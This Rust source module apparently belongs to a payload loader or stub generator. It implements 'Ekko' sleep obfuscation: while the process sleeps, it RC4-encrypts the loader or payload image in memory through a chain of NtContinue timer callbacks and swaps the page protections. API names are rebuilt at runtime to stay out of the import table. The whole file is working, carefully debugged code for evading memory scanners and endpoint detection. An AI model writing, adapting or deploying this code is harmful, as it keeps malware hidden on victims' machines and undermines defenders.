// --- Shared sleep-obfuscation runtime (ekko) ---
//
// One implementation with two callers: the `sleep_obfuscation` preparation and
// the `Sleep` API proxy (`build.stub.api_resolution.hooks.sleep`). The proxy
// path runs this code on payload threads, where the stub's TLS index is not
// provisioned, so this block must stay trace-free: no `tech_dbg!`, no
// `thread_local!`, no panicking paths.
mod sleep_runtime {
    use std::ffi::c_void;
    use std::mem::{size_of, transmute, transmute_copy};

    use windows::core::PCSTR;
    use windows::Win32::Foundation::{CloseHandle, GetLastError, HANDLE, HMODULE};
    use windows::Win32::System::Diagnostics::Debug::{CONTEXT, IMAGE_NT_HEADERS64};
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
    use windows::Win32::System::Memory::{
        VirtualQuery, MEMORY_BASIC_INFORMATION, MEM_COMMIT, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
    };
    use windows::Win32::System::SystemServices::IMAGE_DOS_HEADER;
    use windows::Win32::System::Threading::{CreateEventW, WT_EXECUTEINTIMERTHREAD};

    /// Chunk size for the `SystemFunction032` (RC4) calls. Its data parameter is
    /// a `struct ustring` whose `Length` is a `DWORD` (u32), so one call can
    /// cover the whole image. The chunk stays at 1 MiB: every chunk costs one
    /// timer step (`STEP` ms), so 64 KiB chunks made a multi-megabyte payload
    /// pay seconds of ROP overhead per sleep. RC4 on 1 MiB is orders of
    /// magnitude faster than the stagger, so correctness is unchanged.
    const CHUNK: usize = 0x10_0000;

    /// Stagger between consecutive timer steps, in milliseconds. Each step must
    /// fully return into the timer dispatch before the next one fires. Kept just
    /// under the system timer granularity (~15.6 ms): every extra millisecond
    /// here is paid by every concealed sleep.
    const STEP: u32 = 10;

    /// Due time of the first ROP step, in milliseconds (right after the capture).
    const FIRST_STEP: u32 = 20;

    /// How often to poll for the capture timer to have fired, in milliseconds.
    const CAPTURE_POLL_MS: u32 = 10;

    /// How many polls before giving up on the capture (10 ms * 100 = 1 s).
    const CAPTURE_TRIES: u32 = 100;

    /// `ERROR_SEM_TIMEOUT`-style wait result code for a timed-out wait.
    const WAIT_TIMEOUT: u32 = 0x102;

    /// Pseudo-handle for the current process; waiting on it times out, which is
    /// the whole point of the delay step.
    const CURRENT_PROCESS: isize = -1;

    /// Timer-thread callback ABI (`WAITORTIMERCALLBACK`): parameter + fired flag.
    type TimerCallback = unsafe extern "system" fn(*mut c_void, u8);

    /// `HANDLE CreateTimerQueue(void)`.
    type FnCreateTimerQueue = unsafe extern "system" fn() -> isize;

    /// `BOOL CreateTimerQueueTimer(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID,
    /// DWORD, DWORD, ULONG)`.
    type FnCreateTimerQueueTimer = unsafe extern "system" fn(
        *mut isize,
        isize,
        TimerCallback,
        *mut c_void,
        u32,
        u32,
        u32,
    ) -> i32;

    /// `BOOL DeleteTimerQueueEx(HANDLE, HANDLE)`.
    type FnDeleteTimerQueueEx = unsafe extern "system" fn(isize, isize) -> i32;

    /// `DWORD WaitForSingleObject(HANDLE, DWORD)`.
    type FnWaitForSingleObject = unsafe extern "system" fn(isize, u32) -> u32;

    /// `BOOL SetEvent(HANDLE)`.
    type FnSetEvent = unsafe extern "system" fn(isize) -> i32;

    /// `BOOL VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD)`.
    type FnVirtualProtect = unsafe extern "system" fn(*const c_void, usize, u32, *mut u32) -> i32;

    /// `NTSTATUS NtContinue(PCONTEXT, BOOLEAN)`.
    type FnContinue = unsafe extern "system" fn(*const AlignedContext, u8) -> i32;

    /// `VOID RtlCaptureContext(PCONTEXT)`.
    type FnCaptureContext = unsafe extern "system" fn(*mut AlignedContext);

    /// `NTSTATUS SystemFunction032(struct USTRING*, struct USTRING*)`.
    type FnCrypt = unsafe extern "system" fn(*const UString, *const UString) -> i32;

    /// Appends a Win32 error code to a label.
    ///
    /// The label is rebuilt from obfuscated bytes at the call site, so this
    /// format string carries no diagnostic text. A call site with no error to
    /// report passes `0` (the code is then just noise).
    fn step_error(label: String, code: u32) -> String {
        format!("{label} (code 0x{code:08x})")
    }

    /// `NtContinue` reads the whole x64 `CONTEXT`; the `windows` binding exposes
    /// it with the correct field offsets but only 8-byte alignment, so force 16
    /// (same wrapper the `Get/SetThreadContext` fragments use).
    #[repr(align(16))]
    struct AlignedContext(CONTEXT);

    /// The `struct ustring` layout `SystemFunction032` (RC4) reads: `Length` and
    /// `MaximumLength` are `DWORD`s (u32), not the `USHORT`s of a
    /// `UNICODE_STRING`. Using a `UNICODE_STRING`-shaped pair here silently
    /// truncates the image and smears the two `u16` halves of each length field
    /// into one garbage `u32`.
    #[repr(C)]
    struct UString {
        length: u32,
        maximum_length: u32,
        buffer: *mut u8,
    }

    impl UString {
        /// Wraps an existing byte region without copying it.
        fn from_raw(bytes: *mut u8, len: usize) -> Self {
            Self {
                length: len as u32,
                maximum_length: len as u32,
                buffer: bytes,
            }
        }

        /// Wraps a heap-owned buffer (the RC4 key).
        fn from_bytes(bytes: &mut [u8]) -> Self {
            Self {
                length: bytes.len() as u32,
                maximum_length: bytes.len() as u32,
                buffer: bytes.as_mut_ptr(),
            }
        }
    }

    /// Resolves `name` in `module` and reinterprets it with the requested ABI.
    ///
    /// `name` is a runtime-rebuilt string (`StringsConfig`), so it never appears
    /// in the binary's cleartext. The transmute only fixes the signature; both
    /// sides are function pointers of the same size.
    fn resolve_as<T>(module: HMODULE, name: &str, on_missing: String) -> Result<T, String> {
        let cname = match std::ffi::CString::new(name) {
            Ok(c) => c,
            Err(_) => return Err(on_missing),
        };
        let address = unsafe { GetProcAddress(module, PCSTR(cname.as_ptr() as *const u8)) };
        match address {
            Some(function) => {
                // transmute_copy: the generic target has no size-checkable
                // transmute; every call site uses an 8-byte fn pointer type.
                let raw = function as usize;
                Ok(unsafe { transmute_copy(&raw) })
            }
            None => Err(on_missing),
        }
    }


    /// Queues one timer whose callback is the given continuation. The callback
    /// parameter is the ROP context itself, so when the timer fires the dispatch
    /// hands the context straight to `NtContinue`/`RtlCaptureContext`.
    fn queue_timer(
        queue: isize,
        create_timer_queue_timer: FnCreateTimerQueueTimer,
        callback: TimerCallback,
        context: &AlignedContext,
        due_ms: u32,
    ) -> Result<(), String> {
        let mut timer = 0isize;
        let ok = unsafe {
            create_timer_queue_timer(
                &mut timer,
                queue,
                callback,
                context as *const AlignedContext as *mut c_void,
                due_ms,
                0,
                WT_EXECUTEINTIMERTHREAD.0,
            )
        };
        if ok == 0 {
            return Err(step_error($MSG_CREATE_TIMER_QUEUE_TIMER_FAILED$, unsafe {
                GetLastError().0
            }));
        }
        Ok(())
    }

    /// Owns the timer queue and the completion event of one sleep and tears
    /// them down on every exit path.
    ///
    /// `ekko_sleep` creates it as soon as the event exists and attaches the
    /// queue once `CreateTimerQueue` succeeds. The early returns from
    /// `queue_timer(...)?` release both through `Drop`; the success path calls
    /// [`EkkoCleanup::delete_queue`] and [`EkkoCleanup::close_event`]
    /// explicitly. Both routes share the same flags, so neither handle is
    /// deleted or closed twice.
    ///
    /// `DeleteTimerQueueEx` is resolved before any timer can be queued: without
    /// it a partially queued chain could not be cancelled, so `ekko_sleep`
    /// fails early instead of leaving a queue behind.
    struct EkkoCleanup {
        event: HANDLE,
        queue: isize,
        delete: FnDeleteTimerQueueEx,
        queue_deleted: bool,
        event_closed: bool,
    }

    impl EkkoCleanup {
        /// Takes ownership of the event created before the queue exists.
        fn new(event: HANDLE, delete: FnDeleteTimerQueueEx) -> Self {
            Self {
                event,
                queue: 0,
                delete,
                queue_deleted: false,
                event_closed: false,
            }
        }

        /// Records the queue once `CreateTimerQueue` returned a valid handle.
        fn attach_queue(&mut self, queue: isize) {
            self.queue = queue;
        }

        /// Deletes the queue, waiting for in-flight callbacks.
        ///
        /// `INVALID_HANDLE_VALUE` (-1) as the completion event makes
        /// `DeleteTimerQueueEx` block until every running callback has
        /// returned, so the caller never resumes while a timer callback is
        /// still executing. Pending timers are cancelled.
        fn delete_queue(&mut self) {
            if self.queue_deleted {
                return;
            }
            self.queue_deleted = true;
            let queue = self.queue;
            self.queue = 0;
            if queue == 0 {
                return;
            }
            unsafe {
                let _ = (self.delete)(queue, -1);
            }
        }

        /// Closes the completion event exactly once.
        fn close_event(&mut self) {
            if self.event_closed {
                return;
            }
            self.event_closed = true;
            unsafe {
                let _ = CloseHandle(self.event);
            }
        }
    }

    impl Drop for EkkoCleanup {
        fn drop(&mut self) {
            // Every early return lands here; the success path has already set
            // both flags and this is a no-op.
            self.delete_queue();
            self.close_event();
        }
    }

    /// Builds a continuation context: the captured timer-thread context with a
    /// new instruction pointer, four argument registers, and a stack pointer
    /// lowered by one slot.
    ///
    /// That one slot is the core Ekko trick: `RtlCaptureContext` stores `Rsp`
    /// just past the return address its own caller (the timer dispatch) left on
    /// the stack, so a target function entered at `Rsp - 8` returns straight
    /// into the dispatch and the hijacked timer thread unwinds cleanly instead
    /// of crashing.
    fn rop_context(
        captured: &CONTEXT,
        rip: u64,
        rcx: u64,
        rdx: u64,
        r8: u64,
        r9: u64,
    ) -> CONTEXT {
        let mut context = *captured;
        context.Rip = rip;
        context.Rcx = rcx;
        context.Rdx = rdx;
        context.R8 = r8;
        context.R9 = r9;
        context.Rsp = captured.Rsp.wrapping_sub(8);
        context
    }

    /// Returns the loader's own image `(base, SizeOfImage)`.
    ///
    /// This is the region the `sleep_obfuscation` step encrypts. The `Sleep`
    /// proxy does not use it: it encrypts the payload's mapped image instead
    /// (the region the loader records when it maps it).
    pub fn current_image() -> Result<(usize, usize), String> {
        let image_base = unsafe { GetModuleHandleA(PCSTR::null()) }
            .map_err(|_| $MSG_NO_TARGET_REGIONS$)?
            .0 as usize;
        let dos = image_base as *const IMAGE_DOS_HEADER;
        let nt = unsafe { (image_base + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64 };
        let image_size = unsafe { (*nt).OptionalHeader.SizeOfImage as usize };
        if image_size == 0 {
            return Err($MSG_NO_TARGET_REGIONS$);
        }
        Ok((image_base, image_size))
    }

    /// Runs one obfuscated sleep of `sleep_ms` milliseconds over
    /// `[image_base, image_base + image_size)`.
    ///
    /// Sequence: capture a timer-thread context, then queue a chain of
    /// `NtContinue` timers that flip the region read-write, RC4-encrypt it
    /// (`SystemFunction032`), sleep, decrypt it, restore the original
    /// protections and signal completion. Nothing executes from the region
    /// while it is encrypted or non-executable: the calling thread waits on an
    /// event and every other thread must be running outside the region.
    ///
    /// # Caller contract
    ///
    /// The region must not be executing on another thread for the duration of
    /// the call. The `sleep_obfuscation` step satisfies it because it encrypts
    /// the loader image while the pipeline is single-threaded; the `Sleep`
    /// proxy is responsible for its own guard.
    ///
    /// # Cleanup
    ///
    /// The completion event and the timer queue are owned by [`EkkoCleanup`]:
    /// every early return (including a failed `queue_timer`) cancels the
    /// pending chain, waits for an in-flight callback to return
    /// (`DeleteTimerQueueEx` with `INVALID_HANDLE_VALUE`) and releases both
    /// handles. Nothing is deleted or closed twice, and repeated `Sleep` hook
    /// calls do not leak a kernel event each.
    ///
    /// # Failure
    ///
    /// Because the chain is cancelled on error, a `queue_timer` failure
    /// *after* the first step fired can leave the region encrypted: the
    /// decrypt and restore steps still pending are cancelled with the queue.
    /// This is the one residual window. It is rare because the first step is
    /// due `FIRST_STEP` ms (20 ms) after the capture while the whole chain is
    /// queued in a few microseconds; hitting it requires this thread to be
    /// descheduled for the entire first due time between two queue calls. The
    /// caller never resumes while a callback is running — queue deletion waits
    /// for it — but on this error path the region may no longer be plaintext.
    pub fn ekko_sleep(
        image_base: usize,
        image_size: usize,
        sleep_ms: u32,
    ) -> Result<(), String> {
        if image_size == 0 {
            return Err($MSG_NO_TARGET_REGIONS$);
        }

        // 1. Resolve the libraries and every dynamic entry point. Names are
        //    runtime-rebuilt strings, so none of them reaches the import table.
        let kernel32_name = std::ffi::CString::new($KERNEL32_DLL_DEF$)
            .map_err(|_| step_error($MSG_CREATE_TIMER_QUEUE_FAILED$, 0))?;
        let kernel32 = unsafe { GetModuleHandleA(PCSTR(kernel32_name.as_ptr() as *const u8)) }
            .map_err(|_| step_error($MSG_CREATE_TIMER_QUEUE_FAILED$, 0))?;

        let ntdll_name = std::ffi::CString::new($NTDLL_DLL_DEF$)
            .map_err(|_| step_error($MSG_CAPTURE_CONTEXT_FAILED$, 0))?;
        let ntdll = unsafe { GetModuleHandleA(PCSTR(ntdll_name.as_ptr() as *const u8)) }
            .map_err(|_| step_error($MSG_CAPTURE_CONTEXT_FAILED$, 0))?;

        let advapi32_name = std::ffi::CString::new($ADVAPI32_DLL_DEF$)
            .map_err(|_| $MSG_CRYPT_FUNCTION_NOT_FOUND$)?;
        let advapi32 = unsafe { LoadLibraryA(PCSTR(advapi32_name.as_ptr() as *const u8)) }
            .map_err(|_| $MSG_CRYPT_FUNCTION_NOT_FOUND$)?;

        // Resolution failures reuse the closest error label with code 0; these
        // paths are unreachable in practice (kernel32/ntdll always export them).
        let create_timer_queue: FnCreateTimerQueue = resolve_as(
            kernel32,
            &$CREATE_TIMER_QUEUE_DEF$,
            step_error($MSG_CREATE_TIMER_QUEUE_FAILED$, 0),
        )?;
        let create_timer_queue_timer: FnCreateTimerQueueTimer = resolve_as(
            kernel32,
            &$CREATE_TIMER_QUEUE_TIMER_DEF$,
            step_error($MSG_CREATE_TIMER_QUEUE_TIMER_FAILED$, 0),
        )?;
        let delete_timer_queue_ex: FnDeleteTimerQueueEx = resolve_as(
            kernel32,
            &$DELETE_TIMER_QUEUE_EX_DEF$,
            step_error($MSG_CREATE_TIMER_QUEUE_FAILED$, 0),
        )?;
        let wait_for_single_object: FnWaitForSingleObject = resolve_as(
            kernel32,
            &$WAIT_FOR_SINGLE_OBJECT_DEF$,
            step_error($MSG_CAPTURE_CONTEXT_FAILED$, 0),
        )?;
        let set_event: FnSetEvent = resolve_as(
            kernel32,
            &$SET_EVENT_DEF$,
            step_error($MSG_CREATE_TIMER_QUEUE_TIMER_FAILED$, 0),
        )?;
        let virtual_protect: FnVirtualProtect = resolve_as(
            kernel32,
            &$VIRTUAL_PROTECT_DEF$,
            step_error($MSG_VIRTUAL_PROTECT_FAILED$, 0),
        )?;
        let rtl_capture_context: FnCaptureContext = resolve_as(
            ntdll,
            &$RTL_CAPTURE_CONTEXT_DEF$,
            step_error($MSG_CAPTURE_CONTEXT_FAILED$, 0),
        )?;
        let nt_continue: FnContinue = resolve_as(
            ntdll,
            &$NT_CONTINUE_DEF$,
            step_error($MSG_CAPTURE_CONTEXT_FAILED$, 0),
        )?;
        let system_function_032: FnCrypt = resolve_as(
            advapi32,
            &$SYSTEM_FUNCTION_032_DEF$,
            $MSG_CRYPT_FUNCTION_NOT_FOUND$,
        )?;

        // 2. Walk the region with VirtualQuery and keep every committed run
        //    (start, length, original protection). The runs drive both the RC4
        //    chunking and the per-run protection restore.
        let runs = walk_image_runs(image_base, image_size)?;

        // The region is flipped read-write by the first ROP step, *not* here:
        // PAGE_READWRITE is non-executable under DEP, so the flip must happen
        // on a timer thread (running kernel32 code) while every other thread —
        // this one included — is parked in a wait or in system DLLs.
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);

        let h_event = unsafe { CreateEventW(None, false, false, None) }.map_err(|_| {
            step_error($MSG_CREATE_TIMER_QUEUE_FAILED$, unsafe {
                GetLastError().0
            })
        })?;
        // The guard owns the event from here on, so the `h_queue == 0` return
        // and every `queue_timer(...)?` below close it exactly once.
        let mut cleanup = EkkoCleanup::new(h_event, delete_timer_queue_ex);
        let h_queue = unsafe { create_timer_queue() };
        if h_queue == 0 {
            return Err(step_error($MSG_CREATE_TIMER_QUEUE_FAILED$, unsafe {
                GetLastError().0
            }));
        }
        cleanup.attach_queue(h_queue);

        // 3. Capture a timer-thread context for the continuation chain.
        let captured = AlignedContext(CONTEXT::default());
        let capture_callback: TimerCallback = unsafe { transmute(rtl_capture_context) };
        queue_timer(
            h_queue,
            create_timer_queue_timer,
            capture_callback,
            &captured,
            0,
        )?;

        let capture_ok = 'poll: {
            // `captured` is written by the timer thread through
            // `RtlCaptureContext`; a plain load can be hoisted out of the loop
            // by the optimizer (the write is invisible to it), so read the flag
            // as volatile.
            for _ in 0..CAPTURE_TRIES {
                let rip = unsafe { std::ptr::read_volatile(&captured.0.Rip) };
                if rip != 0 {
                    break 'poll true;
                }
                unsafe {
                    wait_for_single_object(h_event.0 as isize, CAPTURE_POLL_MS);
                }
            }
            false
        };
        if !capture_ok {
            return Err(step_error($MSG_CAPTURE_CONTEXT_FAILED$, WAIT_TIMEOUT));
        }

        // 4. Build the continuation contexts. The RC4 key is a fresh per-build
        //    key; its hex form is rebuilt at runtime by the injected definition.
        let sleep_key: String = $SLEEP_KEY_DEF$;
        let mut key_bytes =
            hex::decode(&sleep_key[..32]).map_err(|_| step_error($MSG_CRYPT_FUNCTION_FAILED$, 0))?;
        let key = UString::from_bytes(&mut key_bytes);

        let mut chunks: Vec<UString> = Vec::new();
        for &(start, len, _) in &runs {
            let mut offset = 0usize;
            while offset < len {
                let n = (len - offset).min(CHUNK);
                chunks.push(UString::from_raw((start + offset) as *mut u8, n));
                offset += n;
            }
        }

        let encrypt_function = system_function_032 as usize as u64;
        let encrypt_contexts: Vec<AlignedContext> = chunks
            .iter()
            .map(|chunk| {
                AlignedContext(rop_context(
                    &captured.0,
                    encrypt_function,
                    chunk as *const UString as usize as u64,
                    &key as *const UString as usize as u64,
                    0,
                    0,
                ))
            })
            .collect();
        let decrypt_contexts: Vec<AlignedContext> = chunks
            .iter()
            .map(|chunk| {
                AlignedContext(rop_context(
                    &captured.0,
                    encrypt_function,
                    chunk as *const UString as usize as u64,
                    &key as *const UString as usize as u64,
                    0,
                    0,
                ))
            })
            .collect();

        let delay_context = AlignedContext(rop_context(
            &captured.0,
            wait_for_single_object as usize as u64,
            CURRENT_PROCESS as usize as u64,
            sleep_ms as u64,
            0,
            0,
        ));

        // First ROP step: flip the whole region read-write so the encryption can
        // write to it. Runs on the timer thread, so no image code executes on NX
        // pages.
        let protect_context = AlignedContext(rop_context(
            &captured.0,
            virtual_protect as usize as u64,
            image_base as u64,
            image_size as u64,
            PAGE_READWRITE.0 as u64,
            &old_protect as *const PAGE_PROTECTION_FLAGS as usize as u64,
        ));

        let restore_function = virtual_protect as usize as u64;
        let restore_contexts: Vec<AlignedContext> = runs
            .iter()
            .map(|&(start, len, protect)| {
                AlignedContext(rop_context(
                    &captured.0,
                    restore_function,
                    start as u64,
                    len as u64,
                    protect as u64,
                    &old_protect as *const PAGE_PROTECTION_FLAGS as usize as u64,
                ))
            })
            .collect();

        let set_event_context = AlignedContext(rop_context(
            &captured.0,
            set_event as usize as u64,
            h_event.0 as usize as u64,
            0,
            0,
            0,
        ));

        // 5. Queue the chain with staggered due times. The decrypt/restore steps
        //    are scheduled *after* the sleep, unlike the original PoC, which let
        //    them fire during it (its best-known flaw).
        let continue_callback: TimerCallback = unsafe { transmute(nt_continue) };
        let mut due: u32 = FIRST_STEP;
        queue_timer(
            h_queue,
            create_timer_queue_timer,
            continue_callback,
            &protect_context,
            due,
        )?;
        due = due.saturating_add(STEP);
        for context in &encrypt_contexts {
            queue_timer(
                h_queue,
                create_timer_queue_timer,
                continue_callback,
                context,
                due,
            )?;
            due = due.saturating_add(STEP);
        }
        let delay_due = due;
        queue_timer(
            h_queue,
            create_timer_queue_timer,
            continue_callback,
            &delay_context,
            due,
        )?;
        due = delay_due.saturating_add(sleep_ms).saturating_add(STEP);
        for context in &decrypt_contexts {
            queue_timer(
                h_queue,
                create_timer_queue_timer,
                continue_callback,
                context,
                due,
            )?;
            due = due.saturating_add(STEP);
        }
        for context in &restore_contexts {
            queue_timer(
                h_queue,
                create_timer_queue_timer,
                continue_callback,
                context,
                due,
            )?;
            due = due.saturating_add(STEP);
        }
        queue_timer(
            h_queue,
            create_timer_queue_timer,
            continue_callback,
            &set_event_context,
            due,
        )?;

        // 6. Wait for the last step to signal completion, then tear the queue
        //    down. The final step signals before its own callback returns, so
        //    deletion waits only for that callback to unwind.
        unsafe {
            wait_for_single_object(h_event.0 as isize, u32::MAX);
        }
        cleanup.delete_queue();
        cleanup.close_event();
        Ok(())
    }

    /// Walks `[base, base + size)` with `VirtualQuery` and returns every
    /// committed run as `(start, length, protection)`, clamped to the requested
    /// range.
    fn walk_image_runs(base: usize, size: usize) -> Result<Vec<(usize, usize, u32)>, String> {
        let mut runs = Vec::new();
        let end = base + size;
        let mut cursor = base;
        while cursor < end {
            let mut info = MEMORY_BASIC_INFORMATION::default();
            let written = unsafe {
                VirtualQuery(
                    Some(cursor as *const c_void),
                    &mut info,
                    size_of::<MEMORY_BASIC_INFORMATION>(),
                )
            };
            if written == 0 {
                return Err(step_error($MSG_VIRTUAL_QUERY_FAILED$, unsafe {
                    GetLastError().0
                }));
            }
            let region_end = (info.BaseAddress as usize).saturating_add(info.RegionSize);
            if region_end <= cursor {
                return Err(step_error($MSG_VIRTUAL_QUERY_FAILED$, 0));
            }
            if info.State == MEM_COMMIT {
                let start = cursor.max(info.BaseAddress as usize);
                let stop = end.min(region_end);
                if stop > start {
                    runs.push((start, stop - start, info.Protect.0));
                }
            }
            cursor = region_end;
        }
        if runs.is_empty() {
            return Err($MSG_NO_TARGET_REGIONS$);
        }
        Ok(runs)
    }
}
